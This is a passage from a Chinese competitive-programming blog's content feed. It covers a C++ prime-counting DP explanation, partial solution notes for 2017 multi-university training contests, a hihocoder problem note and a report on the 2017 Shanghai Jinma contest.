class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">320000</span>;</div><div class="line">ll H[N],L[N];</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">SR</span><span class="params">(ll n,ll p)</span></span></div><div class="line">&#123;</div><div class="line">    ll m;</div><div class="line">    <span class="keyword">for</span> (m=<span class="number">1</span>;m*m&lt;=n;++m) &#123;</div><div class="line">        H[m]=n/m<span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (ll i=<span class="number">1</span>;i&lt;=m;++i) &#123;</div><div class="line">        L[i]=i<span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (ll i=<span class="number">2</span>;i&lt;=m;++i)&#123;</div><div class="line">        <span class="keyword">if</span> (L[i]==L[i<span class="number">-1</span>]) <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">for</span> (ll j=<span class="number">1</span>;j&lt;=min(m<span class="number">-1</span>,n/i/i);++j) &#123;</div><div class="line">            <span class="keyword">if</span>(i*j&lt;m) H[j]-=H[i*j]-L[i<span class="number">-1</span>];</div><div class="line">            <span class="keyword">else</span> H[j]-=L[n/i/j]-L[i<span class="number">-1</span>];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (ll j=m;j&gt;=i*i;--j) &#123;</div><div class="line">            L[j]-=L[j/i]-L[i<span class="number">-1</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> H[<span class="number">1</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ll n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;n)!=EOF) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,SR(n,n));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><code>L[],H[]</code>初始化为筛内总的个数(不含1)。代码中的<code>i</code>用来枚举质数(<code>L[i]==L[i-1]</code>表示<code>i</code>不是质数)，然后对于 $j&gt;i^2$ 的 $j$ 都更新一遍dp值，只是放在了两个不同的数组而已：对于 $j\le \sqrt{n}$ 的$j$更新<code>L[]</code>，对于 $j&gt;\sqrt{n}$ 的 $j$ 更新<code>H[]</code>。只要理解了递推式代码还是很好理解的。</p><p>这个算法的时间复杂度为$O(n^{\frac{3}{4}})$（证明可以看参考资料内的下一条评论），虽然不如Meissel–Lehmer算法，但是dp的思想非常巧妙，值得学习。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>看到csdn和cnblogs上很多人都是把这份代码当作模板直接贴出来不讲解，不仅不尊重原作者，也有悖大家学习数据结构与算法的初衷，是以我不仅要翻译，还要加上一些自己的理解~~</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://codeforces.com/blog/entry/44466?#comment-290036" target="_blank" rel="noopener">Editorial of Educational Codeforces Round 12</a></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017年多校联训3 部分题解</title>
      <url>/blog/2017/08/02/2017-multi3/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/08/01/2017%E5%A4%9A%E6%A0%A13" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1003-Kanade’s-sum"><a href="#1003-Kanade’s-sum" class="headerlink" title="1003.    Kanade’s sum"></a>1003.    Kanade’s sum</h3><h3 id="1005-RXD-and-dividing"><a href="#1005-RXD-and-dividing" class="headerlink" title="1005.    RXD and dividing"></a>1005.    RXD and dividing</h3><h3 id="1006-RXD-and-functions"><a href="#1006-RXD-and-functions" class="headerlink" title="1006.    RXD and functions"></a>1006.    RXD and functions</h3><p>易得，$g_m(x)=f(x-\sum a_i)$ 。</p><p>记 $S=\sum a_i $，代入：</p><p>$$\large \begin{equation}\begin{split}<br>g_m(x)&amp;=\sum_{i=0}^{n}c_i(x-S)^i \\<br>&amp;=\sum_{i=0}^{n}c_i\sum_{j=0}^{i}C_{i}^{j}x^j(-S)^{i-j} \\<br>&amp;=x^0\sum_{j=0}^{n}c_jC_{j}^{0}(-S)^{j-0}+\cdots+x^n\sum_{j=0}^{n}c_jC_{j}^{n}(-S)^{j-n} \\<br>&amp;=\sum_{i=0}^{n}x^i\sum_{j=0}^{n}c_jC_{j}^{i}(-S)^{j-i} \\<br>&amp;=\sum_{i=0}^{n}x^i\sum_{j=i}^{n}c_j\cfrac{j!}{i!\cdot (j-i)!}(-S)^{j-i}<br>\end{split}\end{equation}$$<br>$\large \therefore b_i=\cfrac{1}{i!}\sum_{j=i}^{n}j!c_j\cdot \cfrac{(-S)^{j-i}}{(j-i)!}$<br>记$\large A_i=i!c_i，B_i=i!b_i，d_i=A_{n-i}，e_i=\cfrac{(-S)^{i}}{i!}，(1\le i\le n)$<br>$\large B_i=\sum_{k=i}^{n}A_k\cdot e_{k-i}=\sum_{k=0}^{n-i}d_{n-i-k}e_{k}$</p><p>考虑多项式乘法：<br>$A(x) = \sum_{i=0}^{n}a_ix^{i}$<br>$B(x) = \sum_{i=0}^{n}b_ix^{i}$<br>$C(x) = A(x)B(x) = \sum_{i=0}^{2n}c_ix^{i}$<br>$c_j = \sum_{i=0}^{j}a_ib_{j-i}$，</p><p>所以$B_i$即为多项式$D(x)E(x)$第$n-i$项的系数。</p><p>由于题目是在模意义下的，所以要用NTT，且费马质数必须为所给的模数。</p><h3 id="1011-RXD’s-date"><a href="#1011-RXD’s-date" class="headerlink" title="1011. RXD’s date"></a>1011. RXD’s date</h3>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017年多校联训2 部分题解</title>
      <url>/blog/2017/07/28/2017-multi2/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/07/27/2017%E5%A4%9A%E6%A0%A12" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1001-Is-Derek-lying"><a href="#1001-Is-Derek-lying" class="headerlink" title="1001.    Is Derek lying?"></a>1001.    Is Derek lying?</h3><p>两个人的分数差、分数和，分别满足一个不等式。</p><h3 id="1003-Maximum-Sequence"><a href="#1003-Maximum-Sequence" class="headerlink" title="1003.    Maximum Sequence"></a>1003.    Maximum Sequence</h3><p>贪心，题解里讲得很好。</p><h3 id="1004-Puzzle"><a href="#1004-Puzzle" class="headerlink" title="1004.    Puzzle"></a>1004.    Puzzle</h3><p>见题解。</p><h3 id="1006-Funny-Function"><a href="#1006-Funny-Function" class="headerlink" title="1006.    Funny Function"></a>1006.    Funny Function</h3><p>碰到这种看起来像找规律的题，先打一个表。<br>给一个打表程序吧。。。</p><p>最后的规律当然比题解复杂一点。。。</p><h3 id="1008-To-my-boyfriend"><a href="#1008-To-my-boyfriend" class="headerlink" title="1008.    To my boyfriend"></a>1008.    To my boyfriend</h3><p>求期望相当于求和，求和可以单点贡献相加。</p><p>因为计算不同的数，也就是相同的数只贡献一次，约定一个子矩阵内如果有多个相同的数字则仅由最上并且最左的那个数字贡献。</p><p>对于某行某列的数，考虑它在子矩阵内能产生贡献的边界：</p><ul><li>对于下边界，没有特别的限制；</li><li>对于上边界，不能到达该列相同的数；</li><li>对于左右边界，与上边界有关，且易知上边界越向上，左右边界越靠近该列。</li></ul><p>显然，对于上边界的限制，我们需要维护该列某数字上一次出现的行号。而对于左右边界，实际上也可以类似地获得。</p><p>记当前这个数为$col$，位于$x$行$y$列。用$j$<strong>由远及近</strong>枚举每一列，将第$j$列上$col$上一次出现的那行的$l$更新为$j$，枚举每一列后，再根据上述左右边界的性质，从第$x-1$行向上不断对$l$取$max$(越来越靠近第$y$列)。$r$也是类似地处理。最后再枚举子矩阵的上界，对于每个上界可以$O(1)$累加贡献。总的复杂度$O(n^3)$。</p><p>最后由于我们约定的是最上且最左，所以左边界要考虑到同一行，右边界不用考虑同一行，这一点在读入前清空数组就会自动满足。</p><h3 id="1009-TrickGCD"><a href="#1009-TrickGCD" class="headerlink" title="1009.    TrickGCD"></a>1009.    TrickGCD</h3><p>栗子原话：</p><blockquote><p>现在感觉数列的值域化考的很多啊<br>数列的值域化，还有n/1+n/2+…+n/n=nlogn<br>这两个东西放在一起很热门</p></blockquote><p>根据题目，其实我们只要保证 1~n 总的gcd满足条件即可。</p><p>首先，我们从2开始枚举x，表示总的gcd至少为x，然后就需要容斥，大概感觉一下容斥系数就是 $-\mu(x)$（不会证），所以最终答案 $\large ans=\sum_{x=2}^{min{a_i}} -\mu(x) \prod_{i=1}^{i=n}\lfloor\cfrac{a_i}{x}\rfloor $ 。</p><p>这时候有两个想法。。。</p><p>一是确定的 $a$ 对于某一段 $x$ 总是同一个值，然后按照类似杜教筛的做法，共有 $2\sqrt{a}$ 段，每一段相当于一次区间乘法，可以类似差分地在区间前后打个标记，复杂度$2n\sqrt{A},A=max{a_i}$，然后就TLE了。。。</p><p>二是确定的 $x$ 对于值域在某一段的 $a$ 总是同一个值，因为答案跟 $a$ 序列的顺序无关，就可以直接把 $a$ 序列值域化，然后对于确定的 $x$ 再枚举 $\lfloor\cfrac{a}{x}\rfloor$ 即可，总的复杂度 $O(MlogM),M=10^5$ 。</p><h3 id="1011-Regular-polygon"><a href="#1011-Regular-polygon" class="headerlink" title="1011.    Regular polygon"></a>1011.    Regular polygon</h3><p>整点结论：只有正四边形。可以 $O(1)$ 映射。</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><ol><li><a href="http://bestcoder.hdu.edu.cn/blog/2017-multi-university-training-contest-2-solutions-by-%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6/" target="_blank" rel="noopener">solutions BY 电子科技大学</a></li><li><a href="https://raw.githubusercontent.com/Smlight/ACMer/master/2017/07/27/2017%E5%A4%9A%E6%A0%A12/%E5%9B%BD%E5%AE%B6%E9%9B%86%E8%AE%AD%E9%98%9F2017%E8%AE%BA%E6%96%87%E9%9B%86.pdf" target="_blank" rel="noopener">国家集训队2017论文集</a></li><li><a href="http://www.cnblogs.com/nicetomeetu/p/7261147.html" target="_blank" rel="noopener"> To my boyfriend [ 分析,期望 ] </a></li></ol>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017年多校联训1 部分题解</title>
      <url>/blog/2017/07/26/2017-multi1/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/07/25/2017%E5%A4%9A%E6%A0%A11" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1001-Add-More-Zero"><a href="#1001-Add-More-Zero" class="headerlink" title="1001. Add More Zero"></a>1001. Add More Zero</h3><h3 id="1002-Balala-Power"><a href="#1002-Balala-Power" class="headerlink" title="1002. Balala Power!"></a>1002. Balala Power!</h3><p>每个字符对答案的贡献都可以看作一个26进制的数字，直接按26进制的从高到低位比较大小。由排序不等式，显然贡献越大的对应的数字越大时答案最大。</p><p>注意点：一个字符一旦做过最高位(位数大于1)就不能被赋值为0。</p><h3 id="1003-Colorful-Tree"><a href="#1003-Colorful-Tree" class="headerlink" title="1003. Colorful Tree"></a>1003. Colorful Tree</h3><p>单独考虑每一种颜色，答案就是对于每种颜色，至少经过一次这种颜色的路径条数之和。反过来思考只需要求有多少条路径没有经过这种颜色即可。</p><p>记$u$的颜色为col[u]。对于$v$，若在子树$v$中取$x$，在子树$v$外取$y$，则这些路径一定会经过col[v]。那么有两个推论：</p><ul><li>不经过col[v]的路径的两端$x,y$一定同在子树$v$；</li><li>对于$v$的祖先$u$，若col[v]==col[u]，则在$u$上计算时整棵子树$v$都要被排除。</li></ul><p>这样我们可以用合并线段树的方法解决，复杂度$O(nlogn)$，详见附录2。</p><p>又发现线段树实际上只维护了单点增加的操作，可以用sum[i]表示颜色i需要排除的节点数<strong>对于dfs序</strong>的前缀和，复杂度$O(n)$。</p><h3 id="1006-Function"><a href="#1006-Function" class="headerlink" title="1006. Function"></a>1006. Function</h3><p>考虑置换$a$的一个循环节，长度为$l$，那么有$$\LARGE f(i) = b_{f(a_i)} = b_{b_{f(a_{a_i})}} = \underbrace{b_{\cdots b_{f(i)}}}_{l\text{ times }b}$$</p><p>那么 $f(i)$ 的值在置换 $b$ 中所在的循环节的长度必须为 $l$ 的因数。</p><p>而如果 $f(i)$ 的值确定下来了，这个循环节的另外 $l - 1$ 个数的函数值也都确定下来了。</p><p>答案就是$\sum_{i = 1}^{k} \sum_{j | l_i} {j \cdot cal_j}$，其中 $k$ 是置换 $a$ 中循环节的个数，$l_i$ 表示置换 $a$ 中第 $i$ 个循环节的长度， $cal_j$​​ 表示置换 $b$ 中长度为 $j$ 的循环节的个数。</p><h3 id="1008-Hints-of-sd0061"><a href="#1008-Hints-of-sd0061" class="headerlink" title="1008. Hints of sd0061"></a>1008. Hints of sd0061</h3><h3 id="1009-I-Curse-Myself"><a href="#1009-I-Curse-Myself" class="headerlink" title="1009. I Curse Myself"></a>1009. I Curse Myself</h3><p>按题解写出来的那个方法过的，时间很险，3697ms。。。</p><h3 id="1011-KazaQ’s-Socks"><a href="#1011-KazaQ’s-Socks" class="headerlink" title="1011. KazaQ’s Socks"></a>1011. KazaQ’s Socks</h3><h3 id="1012-Limited-Permutation"><a href="#1012-Limited-Permutation" class="headerlink" title="1012. Limited Permutation"></a>1012. Limited Permutation</h3><p>题目给的信息实际上就是 $p[l_i…r_i]\ge p[i]$。</p><p>首先必须有一个位置 $i$ 满足 $l_i=1,r_i=n$，否则方案数为 0 。考虑 $i$ 左右的两段数，因为 $p[i]$ 是最小的，所以左边数向右的界不会越过 $i$，即 $(r_j \lt i)$ ；右边数向左的界不会越过 $i$，即 $(l_k \gt i)$ 。可以发现：左边数和右边数不会再有任何联系，是完全相同的两个子问题。每次递归给答案累乘<strong>从 $r_i-l_i$ 个数中选出一部分作为左边数</strong>的方案数即可。思路来自附录3，对应<code>1012_NlogN.cpp</code>。</p><p>很显然，递归算法的瓶颈不在于递归本身而在于利用映射查询是否有位置对应$[L,R]$ 。某大佬：用一个栈搞一搞就行了，对应<code>1012.cpp</code>。</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><ol><li><a href="http://bestcoder.hdu.edu.cn/blog/2017-multi-university-training-contest-8-solutions-by-%E5%8C%97%E4%BA%AC%E8%88%AA%E7%A9%BA%E8%88%AA%E5%A4%A9%E5%A4%A7%E5%AD%A6/" target="_blank" rel="noopener">solutions BY 北京航空航天大学</a></li><li><a href="http://blog.csdn.net/banfcc/article/details/76091240" target="_blank" rel="noopener">HDU6035 Colorful Tree</a></li><li><a href="http://blog.csdn.net/say\_c\_box/article/details/76147001" target="_blank" rel="noopener">HDU6044 Limited Permutation</a></li></ol>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hihocoder 1529 不上升序列</title>
      <url>/blog/2017/07/02/hihocoder1529/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>听说最早的题目原型是<a href="http://codeforces.com/problemset/problem/13/C" target="_blank" rel="noopener">CF13C</a><br>下面按这题来讲，其实就是换成了不降。</p><h3 id="朴素DP"><a href="#朴素DP" class="headerlink" title="朴素DP"></a>朴素DP</h3><p>定义$f_i(X)$ 为前$i$个数变为不降序列且$a_i\le X$的最小步数。<br>显然有<br>$f_1(X) = min_{Y\le X}{|a_1-Y|}$<br>$f_i(X) = min_{Y\le X}{f_{i-1}(Y)+|a_i-Y|}$</p><h3 id="离散的DP"><a href="#离散的DP" class="headerlink" title="离散的DP"></a>离散的DP</h3><p>可以令${b_i}$为${a_i}$的一个有序copy，复杂度$O(n^2)$。<br>详情请阅 <a href="http://codeforces.com/blog/entry/364" target="_blank" rel="noopener">CF13C Tutorial</a> 。</p><h3 id="单调性优化"><a href="#单调性优化" class="headerlink" title="单调性优化"></a>单调性优化</h3><p>$f_i(X) = min_{Y\le X}{f_{i-1}(Y)+|a_i-Y|}=min(f_i(X-1),f_{i-1}(X)+|a_i-X|)$<br>由绝对值和最小值的性质，$f_i$对于$X$是一个单减的非负函数，并最后保持一个非负值。<br>考虑其“斜率函数” $g_i(X)=f_i(X+1)-f_i(X)$，则$g_i(X)$单增（不会证）。<br>$g_i(X)$的值域为有限个小于等于0的整数，我们将值域中每个数对应的最小的$x$写为一个序列（即“变化点”），即序列的最后一个数为使得$g_i(x)=0$的最小的$x$，……</p><p>突然发现我还是不会证，，那就没必要了，，大家还是看资料吧。。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="http://codeforces.com/blog/entry/47821" target="_blank" rel="noopener">http://codeforces.com/blog/entry/47821</a></li><li><a href="http://codeforces.com/blog/entry/47094?#comment-315161" target="_blank" rel="noopener">http://codeforces.com/blog/entry/47094?#comment-315161</a></li><li><a href="https://media.hihocoder.com/contests/challenge29/sol.pdf" target="_blank" rel="noopener">https://media.hihocoder.com/contests/challenge29/sol.pdf</a></li></ol>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017年上海金马五校赛 解题报告</title>
      <url>/blog/2017/06/04/2017%E5%B9%B4%E4%B8%8A%E6%B5%B7%E9%87%91%E9%A9%AC%E4%BA%94%E6%A0%A1%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/</url>
      <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>因为题目实在太多了，代码就不贴在博客里了。。。想看代码的童鞋可以去<a href="https://github.com/Smlight/ACMer/tree/master/2017/6%E6%9C%88/%E9%87%91%E9%A9%AC%E4%BA%94%E6%A0%A1%E8%B5%9B" target="_blank" rel="noopener">github</a>上看看。<br>题目似乎看不了了，我只能凭感觉复述一下题意了。。。</p><h3 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h3><p>这个比赛有一个资格赛，但是跟蓝桥杯决赛冲突了所以不能参加，没想到老师帮我们申请了参赛资格，意外之喜。<br>热身刚结束实验室就断电了。。然后吃完饭背着电脑去了没空调的教室。。。</p><h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>B题就不说了，反正一眼。A题首先肯定要把质数都筛出来，本来想在质数表里直接做的，但是发现写不出来。。。主要是因为对于 $a\leq x\leq b-m+1$ 都要成立，这个放到质数表里细节太多。。。所以想还不如直接交个很好写的二分答案，结果一发过了。。。很无语，要不是怕复杂度不太对这个也是看一眼就能写 = = 。。。C题比较难懂，它定义的线段能组成方形实际上跟线段本身的长度没有关系，读了好久才读懂，反正不会做也无所谓了 =。=</p><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p>题意：D、E、E、S、T 做全排列并且按字典序排序，输出第$n$个$(n\leq 60)$。<br>题解：用<code>next_permutation</code>打个表就行啦 <del>虽然CE了两次</del></p><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><p>题意：给出一个 $n\times n$ 四连通的字符地图$(n\leq 50)$，只包含’*‘,’#’两种字符，从’*‘到’#’要消耗1点能量，从’#’到其他也要消耗1点能量。问从$(1,1)$到$(n,n)$至少要消耗多少能量。<br>题解：每个字符与相邻的字符建图，做一次单源最短路。可以用dijkstra+队列优化，时间复杂度$O(2n^2logn+4n^2)$。</p><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>题意：给出$n$个数的序列$(n\leq 20)$，每个数之前可以加正号或者负号，各个数也可以换位置，问最终能有多少不用的结果。<br>题解：显然换位置对于最后答案没有影响，只需要考虑是正是负就可以了。直接dfs，用<code>set</code>去重一下，时间复杂度$O(2^nnlog2)$。</p><h3 id="D"><a href="#D" class="headerlink" title="D"></a>D</h3><p>题意：有一个无穷的字符串序列${a,b,\dots,z,aa,\dots,az,ba,\dots }$，称不含a也不含bc的字符串为beautiful。给出一个串，问这个串之前有多少beautiful的字符串$(|S|\leq 100)$。<br>题目：很明显的数位dp，实际上跟hdu上的<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2089" target="_blank" rel="noopener">不要62</a>差不多，不过这个是不能含a，相当于数字不能含0，那么就不能用前导0来补位了。。。刚开始也想怎么改一改模板，好像改了几十分钟都没搞定，最后就直接各种位数都算一遍就行了 =。= 单组时间复杂度$O(26n^2)$，不过根本到不了，多组就更无压力了。</p><h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><p>题意：求最长回文子串的长度$(|S|&lt;=50)$。<br>题解：枚举中心和中心对暴力，时间复杂度$O(n^2)$。manacher的板子当然更无压力。</p><h3 id="F"><a href="#F" class="headerlink" title="F"></a>F</h3><p>题意：有$n$条公交路线，问从S到T至少转车几次，如果多个方案输出时间最短的。<br>题解：做过类似的，写起来太麻烦没写，所以数据范围也没记清楚。仍然是建图dijkstra，中间好像要处理一下不太记得了 = = </p><h3 id="G"><a href="#G" class="headerlink" title="G"></a>G</h3><p>题意：A和B在$n\times m$的网格图中移动一枚棋子，棋子的初始位置是$(1,1)$，每次只能向右或者向下移动，不能移动者失败。B后手认为游戏不太公平，增加规则，他可以在游戏开始前破坏<strong>至多</strong>一个格子（不能破坏左上角和右下角），游戏中两人不能移动到这个格子。在A最优策略的情况下，问B有没有必胜策略。<br>题解：首先考虑不破坏的情况，显然总共需要$n-1+m-1$步，如果这个数是偶数，那B必胜。再考虑需要破坏的，不妨令$n \lt m$，先填入SG值，$(n,m)$没有后继。</p><table><thead><tr><th style="text-align:center">0</th><th style="text-align:center">1</th><th style="text-align:center">2</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">6</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr></tbody></table><p>可以发现，破坏中间的格子是没有用的，始终都有向右向下两个方向，要破坏就破坏底边的格子。当底边某个格子被破坏后，它左边的格子会没有后继变成0，所以破坏当前是1的格子也是没有用的，我们试着破坏$(3,4)$。</p><table><thead><tr><th style="text-align:center">1</th><th style="text-align:center">2</th><th style="text-align:center">3</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">6</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">2</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">2</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">X</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr></tbody></table><p>可以发现，$(1,1)$的状态确实变了，变成了0，也就是先手必败。再仔细观察，$(1,4),(2,5)$也发生了改变，而且实际上右边还有多少列也没有关系，比如再多两列。</p><table><thead><tr><th style="text-align:center">1</th><th style="text-align:center">2</th><th style="text-align:center">3</th><th style="text-align:center">4</th><th style="text-align:center">5</th><th style="text-align:center">6</th><th style="text-align:center">7</th><th style="text-align:center">8</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">2</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">2</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">X</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr></tbody></table><p>相当于用X在左边规划了一个正方形，后手一定能把棋子移动到X的左边。那么样例的$(3,4)$为什么不行呢？因为要划一个$3\times 3$的正方形必须要破坏$(3,4)$，然而B不能破坏右下角，所以就不能必胜了。<br>综上，$n+m$是偶数或者$abs(n-m)$是大于1的奇数时有必胜策略。</p><h3 id="H"><a href="#H" class="headerlink" title="H"></a>H</h3><p>题意：$n$个数，大小为$k$的滑动窗口从左往右滑动$(k\leq n\leq 10^7)$，求滑动过程中，最大值的平均数、平均数的最大值、标准差的最小值。<br>题解：求平均数和标准差只要维护一下区间和跟区间平方和就行了，求最大值的话参考<a href="http://poj.org/problem?id=2823" target="_blank" rel="noopener">poj2823</a>，可以用双端队列维护。计算过程可以用<code>long double</code>，<code>scanf</code>和<code>printf</code>要用<code>double</code>。。。</p><h3 id="I"><a href="#I" class="headerlink" title="I"></a>I</h3><p>题意：环上有$0\dots n-1$这$n$个点$(n\leq 1000000)$，青蛙从$0$开始每一步跳$x$，问有多少$x$使得青蛙能到达所有的点，青蛙可以跳无穷多次。<br>题解：题意即 $ax-bn=c$ 对于 $c&gt;0$ 均有解。由裴蜀定理可以推知 $gcd(x,n)=1$。输出 $\varphi(n)$ 即可，预处理$O(N)$，回答$O(1)$。</p><h3 id="J"><a href="#J" class="headerlink" title="J"></a>J</h3><p>题意：二维平面有$n$个点，以第一个点为起点、终点，每次走直线段去其他的点，直线段不能相交，问最后能围住多大的面积。<br>题解：刚读完的时候以为求个凸包就行了，后来发现规定了起点终点可能走不了凸包。。。然后就没做了，所以题目记得也不是很清楚。<br><img src="http://img.blog.csdn.net/20170604104149087" alt=""></p><h3 id="K"><a href="#K" class="headerlink" title="K"></a>K</h3><p>题意：在$n\times m$的方格中从(1,1)开始顺时针地蛇形填数，输出结果$(n,m\leq 100)$。</p><blockquote><p>输入：<br>3 3<br>1 2 3 4 5 6 7 8 9<br>输出：<br>1 2 3<br>8 9 4<br>7 6 5</p></blockquote><p>题解：好像有个巧妙的方法，实在不行四种情况都判断一下就行，总之就是模拟。</p><h3 id="L"><a href="#L" class="headerlink" title="L"></a>L</h3><p>没读</p><h3 id="M"><a href="#M" class="headerlink" title="M"></a>M</h3><p>题意：给一个$n\times m$的矩阵D，再给一个kernel，即$3\times 3$的矩阵K，求D关于K的卷积$(n,m\leq 100)$。<br>题解：这题要是不给卷积的公式还真能难倒很多人。。。实际上就是按公式计算一下$$\large C_{i,j}=\sum_{a=0}^{min(n-i-1,2)}\sum_{b=0}^{min(m-j-1,2)}D_{i+a,j+b}\times K_{a,b}$$时间复杂度$O(3^2nm)$。</p><h3 id="N"><a href="#N" class="headerlink" title="N"></a>N</h3><p>题意：$n$可以分解成$k$个正整数$(k\leq n\leq 1000)$，即$\sum_{i=1}^{k}a_i=n$，$a_i$递增，对于每种分解，它的值是这些数两两相乘的和，即$\sum_{i=1}^{k-1}\sum_{j=i+1}^{k}a_i*a_j$。求所有分解的和模$p$，保证$p$是一个奇质数。</p><blockquote><p>输入：<br>5 1000000007<br>输出：<br>44<br>输出解释：<br>5=1+1+1+1+1 值为10<br>5=1+1+1+2   值为9<br>5=1+2+2     值为8<br>5=1+1+3     值为7<br>5=2+3       值为6<br>5=1+4       值为4<br>5=5         值为0</p></blockquote><p>题解：$$记S=\sum_{i=1}^{k-1}\sum_{j=i+1}^{k}a_i*a_j$$ $$\because (\sum_{i=1}^{k}a_i)^2=\sum_{i=1}^{k}a_i^2+2S$$ $$\therefore S=\frac{1}{2}(n^2-\sum_{i=1}^{k}a_i^2)$$由于$S$的值很难维护，我们转而去求所有分解中的数的平方和。借用整数划分的记忆化搜索方法，<code>getspilit(n,m)</code>表示要分解$n$，且分解中出现的数都不超过$m$。分为 $m&gt;n$，$m==n$，$m&lt;n$ 三种情况，后两种再分为最终分解中包不包含m，这样不会重复。同时用<code>f[][]</code>记录不同分解数，<code>g[][]</code>记录所有分解的所有数字的平方和，用<code>f[n][n]</code>倍的$n^2$减去<code>g[n][n]</code>，最后再乘以2的逆元就可以了，时间复杂度$O(n^2)$。</p><h3 id="O"><a href="#O" class="headerlink" title="O"></a>O</h3><p>题意：给出$2n$个数，两两一组，使得每组两个数的差的绝对值之和最小，求这个最小的和。<br>题解：由绝对值的性质，排序后两两分组即可。（可以用初中的数形结合全都标到数轴上证明）</p><h3 id="After"><a href="#After" 